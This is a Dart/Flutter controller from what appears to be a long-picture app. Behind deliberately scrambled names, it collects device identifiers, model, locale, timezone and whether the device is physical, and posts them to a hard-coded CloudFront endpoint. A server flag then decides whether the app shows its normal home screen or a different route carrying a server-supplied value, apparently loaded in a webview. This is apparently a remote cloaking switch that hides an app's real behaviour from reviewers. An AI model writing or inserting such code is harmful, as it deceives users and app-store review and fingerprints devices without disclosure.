import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class LongPicMasterLogic extends GetxController {

  var xgmbjno = RxBool(false);
  var dlqrikywz = RxBool(true);
  var nhjfda = RxString("");
  var krube = RxBool(false);
  var tljwxnb = RxBool(true);
  final wtjhzbcp = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    uoyrc();
  }


  Future<void> uoyrc() async {
    krube.value = true;
    tljwxnb.value = true;
    dlqrikywz.value = false;

    wtjhzbcp.post("https://d1o8cjzpa0z7q8.cloudfront.net/ajjqQ",data: await rbyedv()).then((value) {
      var ndcvkjix = value.data["ndcvkjix"] as String;
      var snkpdjhr = value.data["snkpdjhr"] as bool;
      if (snkpdjhr) {
        nhjfda.value = ndcvkjix;
        qpknu();
      } else {
        ofqy();
      }
    }).catchError((e) {
      dlqrikywz.value = true;
      tljwxnb.value = true;
      krube.value = false;
    });
  }

  Future<Map<String, dynamic>> rbyedv() async {
    final DeviceInfoPlugin vucsq = DeviceInfoPlugin();
    PackageInfo jvunzlk_pilcxqok = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var nkbgc = Platform.localeName;
    var eNuYk = currentTimeZone;

    var ESNZM = jvunzlk_pilcxqok.packageName;
    var vqNMlnV = jvunzlk_pilcxqok.version;
    var GRJI = jvunzlk_pilcxqok.buildNumber;

    var DzsMLWA = jvunzlk_pilcxqok.appName;
    var AgPmJO = "";
    var oNsC  = "";
    var LcsJrQn = "";
    var ybqgwdxf = "";
    var pqnyg = "";
    var ckgdvf = "";
    var weltdpyo = "";


    var jKHtni = "";
    var MUDXA = false;

    if (GetPlatform.isAndroid) {
      jKHtni = "android";
      var qbntljrziy = await vucsq.androidInfo;

      LcsJrQn = qbntljrziy.brand;

      AgPmJO  = qbntljrziy.model;
      oNsC = qbntljrziy.id;

      MUDXA = qbntljrziy.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      jKHtni = "ios";
      var fitkmcuqnd = await vucsq.iosInfo;
      LcsJrQn = fitkmcuqnd.name;
      AgPmJO = fitkmcuqnd.model;

      oNsC = fitkmcuqnd.identifierForVendor ?? "";
      MUDXA  = fitkmcuqnd.isPhysicalDevice;
    }
    var res = {
      "GRJI": GRJI,
      "vqNMlnV": vqNMlnV,
      "AgPmJO": AgPmJO,
      "eNuYk": eNuYk,
      "LcsJrQn": LcsJrQn,
      "weltdpyo" : weltdpyo,
      "oNsC": oNsC,
      "nkbgc": nkbgc,
      "jKHtni": jKHtni,
      "MUDXA": MUDXA,
      "ESNZM": ESNZM,
      "ybqgwdxf" : ybqgwdxf,
      "pqnyg" : pqnyg,
      "ckgdvf" : ckgdvf,
      "DzsMLWA": DzsMLWA,

    };
    return res;
  }

  Future<void> ofqy() async {
    Get.offNamed("/long_home");
  }

  Future<void> qpknu() async {
    Get.offNamed("/long_latest");
  }

}
